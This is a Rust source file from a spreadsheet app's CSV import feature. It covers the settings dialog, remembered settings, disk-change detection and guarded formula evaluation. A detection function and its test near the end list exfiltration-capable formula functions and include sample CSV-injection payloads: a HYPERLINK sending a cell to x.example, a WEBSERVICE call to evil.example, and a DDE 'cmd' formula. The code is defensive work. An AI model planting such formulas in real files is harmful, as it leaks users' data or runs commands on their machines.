//! CSV import: what was decided after opening a file, the import settings
//! dialog, and settings remembered per set of column names.
//!
//! The options model lives in `visigrid_io::csv`; the CLI flags are the same
//! options, which is why the dialog can print the equivalent `vgrid` command.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use gpui::*;
use visigrid_io::csv::{self, ColumnRule, CsvImport, CsvOptions, DateOrder, Encoding};

use crate::app::Spreadsheet;
use crate::mode::Mode;

/// Rows the dialog previews. The counts it shows are for these rows.
pub const PREVIEW_ROWS: usize = 200;
/// Bytes of the file the dialog reads for its preview.
const PREVIEW_BYTES: usize = 1 << 20;

/// What the last CSV import decided, kept while that file is open.
pub struct CsvDocState {
    pub path: PathBuf,
    /// Options the file was imported with.
    pub options: CsvOptions,
    pub formula_cells: Vec<(usize, usize)>,
    /// Values Auto kept as text, and the columns they are in.
    pub kept_as_text: usize,
    pub text_columns: Vec<String>,
    /// Values a chosen Number/Date type could not read, and their columns.
    pub unreadable: usize,
    pub unreadable_columns: Vec<String>,
    pub rows_in_file: usize,
    pub rows_loaded: usize,
    /// `CsvImport::summary_line()`: "comma · UTF-8 · 3 text columns".
    pub summary: String,
    /// Opened with settings remembered for these column names.
    pub used_saved_settings: bool,
    pub banner_visible: bool,
    /// The banner shows the formulas before "Evaluate" runs them.
    pub reviewing_formulas: bool,
    /// Column names as read (letters without a header row).
    pub column_names: Vec<String>,
    /// The file as imported, to notice it changing on disk.
    pub fingerprint: Option<FileFingerprint>,
    /// `CsvImport::formulas_digest` of this import.
    pub formulas_digest: u64,
    /// The formulas the user approved for evaluation, if evaluated.
    pub approved_formulas: Option<u64>,
    /// Evaluation was asked for, but the formulas were not the ones approved
    /// (the file changed): they were left as text.
    pub formulas_changed: bool,
    /// The file changed on disk since this import.
    pub disk_change: Option<DiskChange>,
}

/// Enough of a file to tell whether it changed: modified time and size, and
/// a hash of its first and last 64 KB. The hash catches a rewrite within the
/// same second at the same size, which time and size alone miss.
#[derive(Clone, Debug, PartialEq)]
pub struct FileFingerprint {
    pub modified: Option<std::time::SystemTime>,
    pub size: u64,
    pub quick_hash: [u8; 32],
}

impl FileFingerprint {
    pub fn read(path: &Path) -> Option<Self> {
        use std::io::{Read, Seek, SeekFrom};
        const EDGE: u64 = 64 * 1024;
        let meta = std::fs::metadata(path).ok()?;
        let size = meta.len();
        let mut file = std::fs::File::open(path).ok()?;
        let mut hasher = blake3::Hasher::new();
        hasher.update(&size.to_le_bytes());
        let mut buf = Vec::with_capacity(EDGE as usize);
        file.by_ref().take(EDGE).read_to_end(&mut buf).ok()?;
        hasher.update(&buf);
        if size > EDGE {
            buf.clear();
            file.seek(SeekFrom::Start(size.saturating_sub(EDGE).max(EDGE))).ok()?;
            file.take(EDGE).read_to_end(&mut buf).ok()?;
            hasher.update(&buf);
        }
        Some(Self { modified: meta.modified().ok(), size, quick_hash: *hasher.finalize().as_bytes() })
    }

    /// Equal only if time, size and the quick hash all match.
    pub fn same_file_contents(&self, now: &FileFingerprint) -> bool {
        self.modified == now.modified && self.size == now.size && self.quick_hash == now.quick_hash
    }
}

/// How a CSV changed on disk, for the banner.
#[derive(Clone, Debug)]
pub struct DiskChange {
    pub rows_before: usize,
    pub rows_after: usize,
    /// By name with a header row; empty without one.
    pub new_columns: Vec<String>,
    pub removed_columns: Vec<String>,
    /// Without a header row columns match by position: the count before and after.
    pub columns_before: usize,
    pub columns_after: usize,
    /// The file as seen when this was worked out.
    pub seen: FileFingerprint,
}

impl DiskChange {
    /// "312 rows were added. One new column, region, will come in as Auto."
    pub fn describe(&self, has_header: bool) -> String {
        let mut parts = Vec::new();
        let (b, a) = (self.rows_before, self.rows_after);
        parts.push(match a.cmp(&b) {
            std::cmp::Ordering::Greater => format!("{} row{} added.", a - b, if a - b == 1 { " was" } else { "s were" }),
            std::cmp::Ordering::Less => format!("{} row{} removed.", b - a, if b - a == 1 { " was" } else { "s were" }),
            std::cmp::Ordering::Equal => "Same number of rows; values may have changed.".into(),
        });
        if has_header {
            match self.new_columns.len() {
                0 => {}
                1 => parts.push(format!("One new column, {}, will come in as Auto.", self.new_columns[0])),
                n => parts.push(format!("{n} new columns ({}) will come in as Auto.", self.new_columns.join(", "))),
            }
            if !self.removed_columns.is_empty() {
                parts.push(format!("No longer in the file: {}.", self.removed_columns.join(", ")));
            }
            if self.new_columns.is_empty() && self.removed_columns.is_empty() {
                parts.push("Columns match by name.".into());
            }
        } else if self.columns_after != self.columns_before {
            parts.push(format!(
                "It now has {} columns (was {}); without a header row they match by position.",
                self.columns_after, self.columns_before
            ));
        }
        parts.join(" ")
    }
}

impl CsvDocState {
    pub fn new(
        path: PathBuf,
        options: CsvOptions,
        import: &CsvImport,
        used_saved_settings: bool,
        approved_formulas: Option<u64>,
        formulas_changed: bool,
    ) -> Self {
        Self {
            column_names: import.columns.iter().map(|c| c.name.clone()).collect(),
            fingerprint: FileFingerprint::read(&path),
            formulas_digest: import.formulas_digest,
            approved_formulas: if options.evaluate_formulas { approved_formulas } else { None },
            formulas_changed,
            disk_change: None,
            // A clean import (nothing kept, cut or left as text) shows no banner
            banner_visible: import.message().is_some() || used_saved_settings || formulas_changed,
            path,
            options,
            formula_cells: import.formula_cells.clone(),
            kept_as_text: import.kept_as_text,
            text_columns: import.text_columns.clone(),
            unreadable: import.columns.iter().map(|c| c.unreadable).sum(),
            unreadable_columns: import.columns.iter().filter(|c| c.unreadable > 0).map(|c| c.name.clone()).collect(),
            rows_in_file: import.rows_in_file,
            rows_loaded: import.rows_loaded,
            summary: import.summary_line(),
            used_saved_settings,
            reviewing_formulas: false,
        }
    }

    pub fn file_name(&self) -> String {
        self.path.file_name().and_then(|n| n.to_str()).unwrap_or("file").to_string()
    }

    /// Records in the file, less the header row.
    pub fn data_rows(&self) -> usize {
        self.rows_in_file.saturating_sub(usize::from(!self.options.no_header))
    }

    pub fn truncated(&self) -> bool {
        self.rows_loaded < self.rows_in_file
    }
}

/// The import settings dialog (Mode::CsvImport).
pub struct CsvDialogState {
    pub path: PathBuf,
    pub options: CsvOptions,
    /// The start of the file, read once when the dialog opens.
    head: Vec<u8>,
    pub preview: Result<CsvImport, String>,
    /// 0–4 file settings, 5 the remember box, 6.. column type pills.
    pub focus: usize,
    pub remember: bool,
    pub columns_scroll: ScrollHandle,
}

/// File settings in the dialog's left column, in focus order.
pub const SETTINGS: [&str; 5] = ["Delimiter", "Encoding", "Header row", "Decimal mark", "Cells starting with ="];
pub const REMEMBER_FOCUS: usize = 5;
pub const FIRST_COLUMN_FOCUS: usize = 6;

impl CsvDialogState {
    fn refresh(&mut self) {
        self.preview = csv::preview_bytes(&self.head, &self.options, PREVIEW_ROWS);
    }

    pub fn focus_count(&self) -> usize {
        FIRST_COLUMN_FOCUS + self.preview.as_ref().map_or(0, |p| p.columns.len())
    }

    /// (value, hint) for a file setting.
    pub fn setting(&self, index: usize) -> (String, &'static str) {
        let detected = self.preview.as_ref().ok();
        match index {
            0 => match self.options.delimiter {
                None => (
                    format!("Detected · {}", detected.map_or("Comma", |p| delimiter_name(p.delimiter))),
                    "Read from the first lines of the file.",
                ),
                Some(b';') => ("Semicolon".into(), "Common in European exports."),
                Some(d) => (delimiter_name(d).into(), ""),
            },
            1 => match self.options.encoding {
                None => (
                    format!("Detected · {}", detected.map_or("UTF-8", |p| p.encoding.label())),
                    "From a byte-order mark, else UTF-8, else Windows-1252.",
                ),
                Some(Encoding::Windows1252) => ("Windows-1252".into(), "Older Windows exports."),
                Some(e) => (e.label().into(), ""),
            },
            2 => {
                if self.options.no_header {
                    ("None".into(), "Row 1 is data; columns are named by letter.")
                } else {
                    ("First row".into(), "Column names come from row 1.")
                }
            }
            3 => {
                if self.options.decimal_comma {
                    ("Comma · 1.234,56".into(), "For files from Germany, France, Brazil…")
                } else {
                    ("Point · 1,234.56".into(), "")
                }
            }
            _ => {
                if self.options.evaluate_formulas {
                    ("Evaluate".into(), "Only for files you trust.")
                } else {
                    ("Leave as text".into(), "Safe for files from anyone.")
                }
            }
        }
    }

    /// The `vgrid` command that imports the file the same way.
    ///
    /// `convert` detects a file's delimiter and treats `--delimiter` as the
    /// OUTPUT delimiter; only piped input is read with it. So a chosen
    /// delimiter is written as piped input, or the command would read the
    /// file differently from the dialog.
    pub fn cli_line(&self) -> String {
        let name = shell_quote(self.path.file_name().and_then(|n| n.to_str()).unwrap_or("file.csv"));
        let stem = self.path.file_stem().and_then(|n| n.to_str()).unwrap_or("file");
        let out = shell_quote(&format!("{stem}.sheet"));
        let flags = self.options.cli_flags().join(" ");
        let flags = if flags.is_empty() { String::new() } else { format!(" {flags}") };
        if self.options.delimiter.is_some() {
            format!("vgrid convert -f csv{flags} -t sheet -o {out} < {name}")
        } else {
            format!("vgrid convert {name} -t sheet -o {out}{flags}")
        }
    }
}

pub fn delimiter_name(d: u8) -> &'static str {
    match d {
        b',' => "Comma",
        b';' => "Semicolon",
        b'\t' => "Tab",
        b'|' => "Pipe",
        _ => "Other",
    }
}

fn shell_quote(s: &str) -> String {
    if s.chars().all(|c| c.is_ascii_alphanumeric() || "._-/".contains(c)) {
        s.to_string()
    } else {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}

/// The next rule when a column's type pill is clicked.
pub fn next_rule(rule: ColumnRule) -> ColumnRule {
    match rule {
        ColumnRule::Auto => ColumnRule::Text,
        ColumnRule::Text => ColumnRule::Number,
        ColumnRule::Number => ColumnRule::Date(DateOrder::Ymd),
        ColumnRule::Date(DateOrder::Ymd) => ColumnRule::Date(DateOrder::Dmy),
        ColumnRule::Date(DateOrder::Dmy) => ColumnRule::Date(DateOrder::Mdy),
        ColumnRule::Date(DateOrder::Mdy) => ColumnRule::Skip,
        ColumnRule::Skip => ColumnRule::Auto,
    }
}

/// Set one column's rule in `options`, keyed by its header name (or letter
/// without a header). Auto removes the entry: Auto is the default.
pub fn set_rule(options: &mut CsvOptions, key: &str, rule: ColumnRule) {
    options.columns.retain(|(k, _)| !k.eq_ignore_ascii_case(key));
    if rule != ColumnRule::Auto {
        options.columns.push((key.to_string(), rule));
    }
}

// ============================================================================
// Settings remembered per set of column names
// ============================================================================

/// What is remembered. Deliberately not "evaluate formulas": a file can copy
/// a trusted file's header row, and remembering that choice would run its
/// formulas without asking. Each such file asks again.
#[derive(Clone, Debug, Default, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct SavedCsvSettings {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub delimiter: Option<u8>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub encoding: Option<String>,
    #[serde(default)]
    pub no_header: bool,
    #[serde(default)]
    pub decimal_comma: bool,
    /// (column name, rule): "text", "number", "date:ymd", "skip".
    #[serde(default)]
    pub columns: Vec<(String, String)>,
}

impl SavedCsvSettings {
    pub fn from_options(o: &CsvOptions) -> Self {
        Self {
            delimiter: o.delimiter,
            encoding: o.encoding.map(|e| match e {
                Encoding::Utf8 => "utf-8",
                Encoding::Utf16Le => "utf-16le",
                Encoding::Utf16Be => "utf-16be",
                Encoding::Windows1252 => "windows-1252",
            }.to_string()),
            no_header: o.no_header,
            decimal_comma: o.decimal_comma,
            columns: o.columns.iter().map(|(n, r)| (n.clone(), rule_key(*r))).collect(),
        }
    }

    pub fn to_options(&self) -> CsvOptions {
        CsvOptions {
            delimiter: self.delimiter,
            encoding: self.encoding.as_deref().and_then(|e| match e {
                "utf-8" => Some(Encoding::Utf8),
                "utf-16le" => Some(Encoding::Utf16Le),
                "utf-16be" => Some(Encoding::Utf16Be),
                "windows-1252" => Some(Encoding::Windows1252),
                _ => None,
            }),
            no_header: self.no_header,
            decimal_comma: self.decimal_comma,
            columns: self.columns.iter().filter_map(|(n, r)| Some((n.clone(), parse_rule_key(r)?))).collect(),
            ..Default::default()
        }
    }
}

fn rule_key(rule: ColumnRule) -> String {
    match rule {
        ColumnRule::Auto => "auto".into(),
        ColumnRule::Text => "text".into(),
        ColumnRule::Number => "number".into(),
        ColumnRule::Date(DateOrder::Ymd) => "date:ymd".into(),
        ColumnRule::Date(DateOrder::Dmy) => "date:dmy".into(),
        ColumnRule::Date(DateOrder::Mdy) => "date:mdy".into(),
        ColumnRule::Skip => "skip".into(),
    }
}

fn parse_rule_key(s: &str) -> Option<ColumnRule> {
    Some(match s {
        "auto" => ColumnRule::Auto,
        "text" => ColumnRule::Text,
        "number" => ColumnRule::Number,
        "date:ymd" => ColumnRule::Date(DateOrder::Ymd),
        "date:dmy" => ColumnRule::Date(DateOrder::Dmy),
        "date:mdy" => ColumnRule::Date(DateOrder::Mdy),
        "skip" => ColumnRule::Skip,
        _ => return None,
    })
}

/// Which saved settings a file gets: a hash of its first line, normalized.
///
/// The raw line rather than parsed column names, so a file whose delimiter
/// was guessed wrong (the reason settings were saved) still finds them.
pub fn header_key(path: &Path) -> Option<String> {
    let head = csv::read_head(path, 64 * 1024).ok()?;
    header_key_from_bytes(&head)
}

fn header_key_from_bytes(bytes: &[u8]) -> Option<String> {
    let (text, _) = visigrid_io::csv_import::decode(bytes, None);
    let line = text.lines().next()?.trim().to_lowercase();
    if line.is_empty() {
        return None;
    }
    Some(blake3::hash(line.as_bytes()).to_hex()[..16].to_string())
}

fn saved_settings_path() -> PathBuf {
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("visigrid")
        .join("csv_import.json")
}

fn load_all_saved() -> BTreeMap<String, SavedCsvSettings> {
    std::fs::read_to_string(saved_settings_path())
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

/// Saved settings for a file, if its first line has any.
pub fn saved_options_for(path: &Path) -> Option<CsvOptions> {
    let key = header_key(path)?;
    load_all_saved().get(&key).map(SavedCsvSettings::to_options)
}

fn save_options_for(path: &Path, options: &CsvOptions, remember: bool) -> Result<(), String> {
    let Some(key) = header_key(path) else { return Ok(()) };
    let mut all = load_all_saved();
    if remember {
        all.insert(key, SavedCsvSettings::from_options(options));
    } else if all.remove(&key).is_none() {
        return Ok(());
    }
    let file = saved_settings_path();
    if let Some(dir) = file.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    let json = serde_json::to_string_pretty(&all).map_err(|e| e.to_string())?;
    std::fs::write(&file, json).map_err(|e| e.to_string())
}

// ============================================================================
// Spreadsheet: banner and dialog actions
// ============================================================================

impl Spreadsheet {
    /// The CSV state for the file that is open now (None after opening
    /// something else).
    pub fn current_csv(&self) -> Option<&CsvDocState> {
        self.csv_doc.as_ref().filter(|c| self.current_file.as_ref() == Some(&c.path))
    }

    pub fn dismiss_csv_banner(&mut self, cx: &mut Context<Self>) {
        if let Some(doc) = self.csv_doc.as_mut() {
            doc.banner_visible = false;
        }
        cx.notify();
    }

    pub fn show_csv_import_dialog(&mut self, cx: &mut Context<Self>) {
        let Some(doc) = self.current_csv() else {
            self.status_message = Some("Import settings apply to an open CSV file".into());
            cx.notify();
            return;
        };
        let path = doc.path.clone();
        let options = doc.options.clone();
        let remember = saved_options_for(&path).is_some();
        let head = match csv::read_head(&path, PREVIEW_BYTES) {
            Ok(head) => head,
            Err(e) => {
                self.status_message = Some(format!("Could not read {}: {e}", path.display()));
                cx.notify();
                return;
            }
        };
        let mut state = CsvDialogState {
            path,
            options,
            head,
            preview: Err(String::new()),
            focus: 0,
            remember,
            columns_scroll: ScrollHandle::new(),
        };
        state.refresh();
        self.csv_dialog = Some(state);
        self.mode = Mode::CsvImport;
        cx.notify();
    }

    pub fn close_csv_import_dialog(&mut self, cx: &mut Context<Self>) {
        self.csv_dialog = None;
        if self.mode == Mode::CsvImport {
            self.mode = Mode::Navigation;
        }
        cx.notify();
    }

    /// Change the focused (or clicked) control: a file setting, the remember
    /// box, or a column's type.
    pub fn csv_dialog_cycle(&mut self, index: usize, cx: &mut Context<Self>) {
        let Some(state) = self.csv_dialog.as_mut() else { return };
        state.focus = index;
        let o = &mut state.options;
        match index {
            0 => {
                o.delimiter = match o.delimiter {
                    None => Some(b','),
                    Some(b',') => Some(b';'),
                    Some(b';') => Some(b'\t'),
                    Some(b'\t') => Some(b'|'),
                    _ => None,
                }
            }
            1 => {
                o.encoding = match o.encoding {
                    None => Some(Encoding::Utf8),
                    Some(Encoding::Utf8) => Some(Encoding::Windows1252),
                    Some(Encoding::Windows1252) => Some(Encoding::Utf16Le),
                    _ => None,
                }
            }
            2 => o.no_header = !o.no_header,
            3 => o.decimal_comma = !o.decimal_comma,
            4 => o.evaluate_formulas = !o.evaluate_formulas,
            REMEMBER_FOCUS => {
                state.remember = !state.remember;
                cx.notify();
                return;
            }
            column => {
                let Some(decision) = state.preview.as_ref().ok().and_then(|p| p.columns.get(column - FIRST_COLUMN_FOCUS)) else {
                    return;
                };
                let (key, rule) = (decision.name.clone(), next_rule(decision.rule));
                set_rule(o, &key, rule);
            }
        }
        state.refresh();
        cx.notify();
    }

    pub fn csv_dialog_focus(&mut self, delta: isize, cx: &mut Context<Self>) {
        if let Some(state) = self.csv_dialog.as_mut() {
            let n = state.focus_count() as isize;
            state.focus = ((state.focus as isize + delta).rem_euclid(n)) as usize;
            if state.focus >= FIRST_COLUMN_FOCUS {
                state.columns_scroll.scroll_to_item(state.focus - FIRST_COLUMN_FOCUS);
            }
            cx.notify();
        }
    }

    /// Re-import with the dialog's settings, and remember them if asked.
    pub fn csv_dialog_apply(&mut self, cx: &mut Context<Self>) {
        let Some(state) = self.csv_dialog.take() else { return };
        self.mode = Mode::Navigation;
        if let Err(e) = save_options_for(&state.path, &state.options, state.remember) {
            self.status_message = Some(format!("Could not save import settings: {e}"));
        }
        // Choosing "Evaluate" in the dialog approves the formulas of the file
        // as it was imported; if it has changed since, they stay text
        let approved = state.options.evaluate_formulas.then(|| self.current_csv().map(|c| c.formulas_digest)).flatten();
        self.start_csv_import_with(&state.path, Some(state.options), approved, cx);
    }

    /// "Review and evaluate…": show the formulas in the banner first.
    pub fn csv_review_formulas(&mut self, open: bool, cx: &mut Context<Self>) {
        if let Some(doc) = self.csv_doc.as_mut() {
            doc.reviewing_formulas = open;
        }
        cx.notify();
    }

    /// The review step's "Evaluate N formulas": same settings, formulas on.
    pub fn csv_evaluate_formulas(&mut self, cx: &mut Context<Self>) {
        // Only from the review step, where the formulas were on screen
        if !self.current_csv().is_some_and(|c| c.reviewing_formulas) {
            return;
        }
        let Some(doc) = self.current_csv() else { return };
        let path = doc.path.clone();
        let mut options = doc.options.clone();
        options.evaluate_formulas = true;
        // Approves exactly the formulas the review showed
        let approved = Some(doc.formulas_digest);
        self.start_csv_import_with(&path, Some(options), approved, cx);
    }

    /// The banner's "Show which cells": select the first formula left as
    /// text and list the rest in the status bar.
    pub fn csv_show_formula_cells(&mut self, cx: &mut Context<Self>) {
        let Some(doc) = self.current_csv() else { return };
        let cells = doc.formula_cells.clone();
        let Some(&(row, col)) = cells.first() else { return };
        self.view_state.selected = (row, col);
        self.view_state.selection_end = None;
        self.ensure_cell_visible(row, col);
        let mut refs: Vec<String> = cells.iter().take(8).map(|&(r, c)| self.cell_ref_at(r, c)).collect();
        if cells.len() > 8 {
            refs.push(format!("and {} more", cells.len() - 8));
        }
        self.status_message = Some(format!("Formulas left as text: {}", refs.join(", ")));
        cx.notify();
    }

    /// On window focus: has the open CSV changed on disk? Time and size are
    /// read first; the quick hash only when they match. A change is described
    /// in the background (record count, header) and shown in the banner.
    pub fn check_csv_on_disk(&mut self, cx: &mut Context<Self>) {
        let Some(doc) = self.current_csv() else { return };
        let Some(before) = doc.fingerprint.clone() else { return };
        let path = doc.path.clone();
        let Some(now) = FileFingerprint::read(&path) else { return };
        if before.same_file_contents(&now) {
            return;
        }
        if doc.disk_change.as_ref().is_some_and(|c| c.seen.same_file_contents(&now)) {
            return; // already reported this version
        }
        let options = doc.options.clone();
        let (rows_before, names_before) = (doc.rows_in_file, doc.column_names.clone());
        cx.spawn(async move |this, cx| {
            let counted = cx
                .background_executor()
                .spawn({
                    let path = path.clone();
                    async move { csv::count_records(&path, &options) }
                })
                .await;
            let Ok((rows_after, first)) = counted else { return };
            let _ = this.update(cx, |this, cx| {
                let Some(doc) = this.csv_doc.as_mut().filter(|d| d.path == path) else { return };
                let has_header = !doc.options.no_header;
                let lower = |v: &[String]| v.iter().map(|s| s.to_lowercase()).collect::<Vec<_>>();
                let (before_l, after_l) = (lower(&names_before), lower(&first));
                doc.disk_change = Some(DiskChange {
                    rows_before,
                    rows_after,
                    new_columns: if has_header { first.iter().filter(|n| !before_l.contains(&n.to_lowercase())).cloned().collect() } else { Vec::new() },
                    removed_columns: if has_header { names_before.iter().filter(|n| !after_l.contains(&n.to_lowercase())).cloned().collect() } else { Vec::new() },
                    columns_before: names_before.len(),
                    columns_after: first.len(),
                    seen: now,
                });
                doc.banner_visible = true;
                doc.reviewing_formulas = false;
                cx.notify();
            });
        })
        .detach();
    }

    /// "Re-import with the same settings". Column rules are keyed by name with
    /// a header row and by letter without one, so they follow the columns.
    /// Formulas are evaluated again only if they are the ones approved.
    pub fn csv_reimport_changed(&mut self, cx: &mut Context<Self>) {
        let Some(doc) = self.current_csv() else { return };
        let (path, options, approved) = (doc.path.clone(), doc.options.clone(), doc.approved_formulas);
        self.start_csv_import_with(&path, Some(options), approved, cx);
    }

    /// Writing over a CSV whose rows did not all fit would delete those rows.
    /// Checked where files are written, so every route (Save As, save on
    /// close, Export CSV/TSV) is covered — CSV never saves in place anyway.
    pub fn csv_overwrite_refusal(&self, target: &Path) -> Option<String> {
        let (source, lost) = self.csv_protected_source.as_ref()?;
        same_path(target, source).then(|| {
            format!(
                "Not saved: {} has {} more rows than fit in a sheet; writing over it would delete them. Choose another name.",
                source.file_name().and_then(|n| n.to_str()).unwrap_or("the file"),
                lost
            )
        })
    }
}

/// The same file, whether or not the target exists yet.
fn same_path(a: &Path, b: &Path) -> bool {
    let canon = |p: &Path| {
        std::fs::canonicalize(p).ok().or_else(|| {
            let parent = std::fs::canonicalize(p.parent()?).ok()?;
            Some(parent.join(p.file_name()?))
        })
    };
    match (canon(a), canon(b)) {
        (Some(a), Some(b)) => a == b,
        _ => a == b,
    }
}

#[cfg(test)]
mod tests {
    // Not `super::*`: that brings in gpui's own `test` macro
    use super::{header_key_from_bytes, next_rule, set_rule, CsvDialogState, SavedCsvSettings};
    use gpui::ScrollHandle;
    use std::path::PathBuf;
    use visigrid_io::csv::{ColumnRule, CsvOptions, DateOrder, Encoding};

    #[test]
    fn type_pill_cycles_through_every_rule_and_back() {
        let mut rule = ColumnRule::Auto;
        let mut seen = Vec::new();
        for _ in 0..7 {
            rule = next_rule(rule);
            seen.push(rule);
        }
        assert_eq!(rule, ColumnRule::Auto);
        assert!(seen.contains(&ColumnRule::Date(DateOrder::Dmy)));
        assert!(seen.contains(&ColumnRule::Skip));
    }

    #[test]
    fn auto_removes_the_column_entry() {
        let mut o = CsvOptions::default();
        set_rule(&mut o, "zip", ColumnRule::Text);
        set_rule(&mut o, "ZIP", ColumnRule::Number);
        assert_eq!(o.columns, vec![("ZIP".to_string(), ColumnRule::Number)]);
        set_rule(&mut o, "zip", ColumnRule::Auto);
        assert!(o.columns.is_empty());
    }

    #[test]
    fn saved_settings_round_trip_but_never_keep_formulas_on() {
        let o = CsvOptions {
            delimiter: Some(b';'),
            encoding: Some(Encoding::Windows1252),
            no_header: false,
            decimal_comma: true,
            evaluate_formulas: true,
            columns: vec![("zip".into(), ColumnRule::Text), ("when".into(), ColumnRule::Date(DateOrder::Dmy))],
            origin: (0, 0),
        };
        let json = serde_json::to_string(&SavedCsvSettings::from_options(&o)).unwrap();
        let back: SavedCsvSettings = serde_json::from_str(&json).unwrap();
        let r = back.to_options();
        assert_eq!(r.delimiter, Some(b';'));
        assert_eq!(r.encoding, Some(Encoding::Windows1252));
        assert!(r.decimal_comma);
        assert_eq!(r.columns, o.columns);
        assert!(!r.evaluate_formulas, "formulas must be asked for each file");
    }

    #[test]
    fn header_key_ignores_case_and_the_rest_of_the_file() {
        let a = header_key_from_bytes(b"Zip;SKU;Amount\r\n00501;007;1\n").unwrap();
        let b = header_key_from_bytes(b"zip;sku;amount\n99999;x;2\n").unwrap();
        let c = header_key_from_bytes(b"zip;sku;total\n").unwrap();
        assert_eq!(a, b);
        assert_ne!(a, c);
        assert_eq!(header_key_from_bytes(b"\n"), None);
    }

    #[test]
    fn cli_line_names_the_file_and_the_flags() {
        let mut options = CsvOptions::default();
        set_rule(&mut options, "zip", ColumnRule::Text);
        options.decimal_comma = true;
        let state = CsvDialogState {
            path: PathBuf::from("/tmp/orders 2024.csv"),
            options,
            head: Vec::new(),
            preview: Err(String::new()),
            focus: 0,
            remember: false,
            columns_scroll: ScrollHandle::new(),
        };
        assert_eq!(
            state.cli_line(),
            "vgrid convert 'orders 2024.csv' -t sheet -o 'orders 2024.sheet' --text zip --decimal-comma"
        );
    }

    #[test]
    fn a_chosen_delimiter_is_written_as_piped_input() {
        // `convert file.csv --delimiter ';'` sets the output delimiter and
        // still sniffs the file; piped input is read with it.
        let mut options = CsvOptions::default();
        options.delimiter = Some(b';');
        options.encoding = Some(Encoding::Windows1252);
        let state = CsvDialogState {
            path: PathBuf::from("/tmp/orders.csv"),
            options,
            head: Vec::new(),
            preview: Err(String::new()),
            focus: 0,
            remember: false,
            columns_scroll: ScrollHandle::new(),
        };
        assert_eq!(
            state.cli_line(),
            "vgrid convert -f csv --delimiter ';' --encoding windows-1252 -t sheet -o orders.sheet < orders.csv"
        );
    }
}

/// Does a formula reach outside the sheet (a link, a web request, an import)?
/// Such formulas are how a CSV exfiltrates data, so the review calls them out.
pub fn reaches_outside(formula: &str) -> bool {
    const OUTSIDE: [&str; 9] = [
        "HYPERLINK(", "WEBSERVICE(", "IMPORTXML(", "IMPORTDATA(", "IMPORTHTML(",
        "IMPORTRANGE(", "IMPORTFEED(", "IMAGE(", "://",
    ];
    let upper = formula.to_ascii_uppercase();
    OUTSIDE.iter().any(|needle| upper.contains(needle)) || formula.contains("|'")
}

#[cfg(test)]
mod outside_tests {
    use super::reaches_outside;

    #[test]
    fn links_requests_and_dde_count_as_outside() {
        assert!(reaches_outside(r#"=HYPERLINK("http://x.example?d="&A1,"promo")"#));
        assert!(reaches_outside("=webservice(\"https://evil.example\")"));
        assert!(reaches_outside("=IMPORTXML(A1,\"//a\")"));
        assert!(reaches_outside("=cmd|' /C calc'!A0"), "DDE");
        assert!(!reaches_outside("=1+1"));
        assert!(!reaches_outside("=SUM(A1:A3)"));
    }
}

#[cfg(test)]
mod safety_tests {
    use super::{same_path, DiskChange, FileFingerprint};
    use std::fs::{self, File};

    fn temp_dir(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("vg-csv-safety-{tag}-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn a_same_size_same_second_rewrite_is_still_a_change() {
        let dir = temp_dir("fp");
        let path = dir.join("orders.csv");
        fs::write(&path, "id,note\n1,=1+1\n").unwrap();
        let before = FileFingerprint::read(&path).unwrap();
        let stamp = fs::metadata(&path).unwrap().modified().unwrap();

        // Same length, different formula, and the old modified time put back
        fs::write(&path, "id,note\n1,=9+9\n").unwrap();
        File::options().write(true).open(&path).unwrap().set_modified(stamp).unwrap();
        let after = FileFingerprint::read(&path).unwrap();

        assert_eq!((before.modified, before.size), (after.modified, after.size), "time and size alone miss it");
        assert!(!before.same_file_contents(&after), "the content hash catches it");
        assert!(before.same_file_contents(&FileFingerprint { ..before.clone() }));
        let _ = fs::remove_dir_all(&dir);
    }

    fn change(before: usize, after: usize, new: &[&str], removed: &[&str], cols: (usize, usize)) -> DiskChange {
        DiskChange {
            rows_before: before,
            rows_after: after,
            new_columns: new.iter().map(|s| s.to_string()).collect(),
            removed_columns: removed.iter().map(|s| s.to_string()).collect(),
            columns_before: cols.0,
            columns_after: cols.1,
            seen: FileFingerprint { modified: None, size: 0, quick_hash: [0; 32] },
        }
    }

    #[test]
    fn disk_change_matches_by_name_with_a_header_and_by_position_without() {
        assert_eq!(
            change(100, 412, &["region"], &[], (6, 7)).describe(true),
            "312 rows were added. One new column, region, will come in as Auto."
        );
        assert_eq!(
            change(10, 9, &[], &["notes"], (6, 5)).describe(true),
            "1 row was removed. No longer in the file: notes."
        );
        assert_eq!(change(5, 5, &[], &[], (3, 3)).describe(true), "Same number of rows; values may have changed. Columns match by name.");
        assert_eq!(
            change(5, 6, &[], &[], (3, 4)).describe(false),
            "1 row was added. It now has 4 columns (was 3); without a header row they match by position."
        );
    }

    #[test]
    fn same_path_sees_through_relative_paths_and_missing_targets() {
        let dir = temp_dir("same");
        let source = dir.join("events.csv");
        fs::write(&source, "a\n").unwrap();
        assert!(same_path(&dir.join(".").join("events.csv"), &source));
        assert!(!same_path(&dir.join("events.sheet"), &source), "a target that does not exist yet");
        let _ = fs::remove_dir_all(&dir);
    }
}
